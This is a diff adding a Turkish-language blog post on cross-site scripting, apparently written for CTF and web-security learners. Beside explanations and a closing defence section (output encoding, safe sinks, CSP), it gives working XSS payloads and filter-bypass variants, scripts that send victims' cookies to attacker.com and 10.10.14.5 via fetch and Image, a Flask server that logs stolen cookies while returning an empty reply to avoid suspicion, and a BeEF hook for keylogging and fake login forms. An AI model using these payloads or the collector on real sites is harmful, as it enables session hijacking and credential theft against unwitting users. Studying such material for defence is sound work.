@@ -1,0 +1,197 @@
+---
+title: "XSS: Cross-Site Scripting Saldırıları"
+date: "2026-03-11"
+description: "Reflected, Stored ve DOM tabanlı XSS türlerini, bypass tekniklerini ve gerçek senaryolarda cookie çalmayı pratik örneklerle inceledim."
+tags: ["Web Güvenliği", "CTF"]
+---
+
+## XSS Nedir?
+
+Cross-Site Scripting (XSS), kullanıcıdan gelen verinin doğrudan HTML çıktısına yansıtılmasıyla oluşur. Tarayıcı bu veriyi JavaScript olarak çalıştırır. Sonuç: oturum çalma, keylogger, phishing veya tam tarayıcı kontrolü.
+
+> SQL Injection veritabanına saldırır. XSS kurbanın tarayıcısına saldırır.
+
+## Üç Temel Tür
+
+### 1. Reflected XSS
+
+Payload URL parametresinde taşınır, sunucu bunu olduğu gibi sayfaya yansıtır. Kalıcı değildir — kurbanın özel bir linke tıklaması gerekir.
+
+```
+https://hedef.com/search?q=<script>alert(1)</script>
+```
+
+### 2. Stored XSS
+
+Payload veritabanına kaydedilir, her sayfa yüklenişinde çalışır. En tehlikeli türdür — yorum kutuları, forum mesajları, profil alanları yaygın hedeflerdir.
+
+```html
+<!-- Yorum kutusuna girildiğinde sunucuya kaydedilir -->
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+```
+
+### 3. DOM-Based XSS
+
+Sunucu hiç devreye girmez. JavaScript, URL'deki veriyi okuyup DOM'a yazarken açık oluşur.
+
+```javascript
+// Savunmasız kod
+document.getElementById("output").innerHTML = location.hash.slice(1);
+
+// Sömürü: URL'e ekle
+https://hedef.com/page#<img src=x onerror=alert(1)>
+```
+
+## Temel Payload'lar
+
+```html
+<!-- Klasik test -->
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+
+<!-- Script tag engelliyse alternatifler -->
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+
+<!-- Tırnak karakteri filtreliyse -->
+<script>alert`1`</script>
+<svg/onload=alert(1)>
+```
+
+## Filter Bypass Teknikleri
+
+```html
+<!-- Büyük/küçük harf karışımı -->
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+
+<!-- Kodlama -->
+<script>alert('\x61\x6c\x65\x72\x74\x281\x29')</script>
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+<!-- Boşluk alternatifleri -->
+<img/src=x/onerror=alert(1)>
+<img	src=x onerror=alert(1)>   <!-- tab karakteri -->
+
+<!-- Protokol manipülasyonu -->
+<a href="javascript:alert(1)">tıkla</a>
+<a href="JaVaScRiPt:alert(1)">tıkla</a>
+
+<!-- Double encoding -->
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+```
+
+## Gerçek Saldırı: Cookie Çalma
+
+Kendi sunucunuzda basit bir cookie toplayıcı:
+
+```python
+# collector.py — Flask ile
+from flask import Flask, request
+import datetime
+
+app = Flask(__name__)
+
+@app.route('/')
+def collect():
+    cookie = request.args.get('c', '')
+    ip = request.remote_addr
+    ts = datetime.datetime.now().isoformat()
+    with open('stolen.log', 'a') as f:
+        f.write(f"[{ts}] {ip} → {cookie}\n")
+    print(f"[+] Cookie alındı: {cookie}")
+    return '', 204  # içerik döndürme, şüphe çekme
+
+app.run(host='0.0.0.0', port=80)
+```
+
+XSS payload'ı:
+
+```javascript
+// Tek satır — yorum kutusuna yapıştır
+<script>new Image().src='http://10.10.14.5/?c='+encodeURIComponent(document.cookie)</script>
+
+// Daha gizli — fetch API ile
+<script>fetch('http://10.10.14.5/?c='+btoa(document.cookie))</script>
+```
+
+## BeEF ile Tarayıcı Kontrolü
+
+```bash
+# BeEF başlat
+cd /usr/share/beef-xss
+./beef
+
+# Panel: http://127.0.0.1:3000/ui/panel
+# Kullanıcı/parola: beef/beef
+```
+
+Hedef sayfaya hook yerleştirin:
+
+```html
+<script src="http://10.10.14.5:3000/hook.js"></script>
+```
+
+Hook bağlandıktan sonra BeEF panelinden:
+- Ekran görüntüsü al
+- Keylogger aktif et
+- Sahte login formu göster
+- Ağ taraması yap
+
+## DOM XSS — Tehlikeli Sink'ler
+
+```javascript
+// Bu fonksiyonlara kullanıcı verisi geliyorsa XSS riski var
+element.innerHTML = userInput;          // ❌
+element.outerHTML = userInput;          // ❌
+document.write(userInput);             // ❌
+eval(userInput);                       // ❌
+setTimeout(userInput, 100);            // ❌
+location.href = userInput;             // ❌ (javascript: protokolü)
+
+// Güvenli alternatifler
+element.textContent = userInput;       // ✅
+element.setAttribute('value', input);  // ✅ (event handler değilse)
+```
+
+## Savunma
+
+```javascript
+// ❌ Tehlikeli
+element.innerHTML = req.query.name;
+
+// ✅ Encode et
+function htmlEncode(str) {
+  return str
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+element.innerHTML = htmlEncode(req.query.name);
+
+// ✅ Daha iyisi — textContent kullan
+element.textContent = req.query.name;
+```
+
+```http
+# Content Security Policy ile script kaynağı kısıtla
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
+```
+
+## CTF'te XSS Hızlı Kontrol Listesi
+
+```
+1. Her input alanına <script>alert(1)</script> dene
+2. Yansıma nerede? HTML içi / attribute / JavaScript?
+3. Hangi karakterler filtreleniyor? < > " ' /
+4. Encoding denendi mi? URL / HTML / Unicode
+5. CSP var mı? (F12 → Network → Response Headers)
+6. DOM kaynaklarını tara: location.* / document.referrer
+```
+
+Bir sonraki yazıda **SSRF (Server-Side Request Forgery)** ve iç ağ erişim tekniklerini ele alacağım.
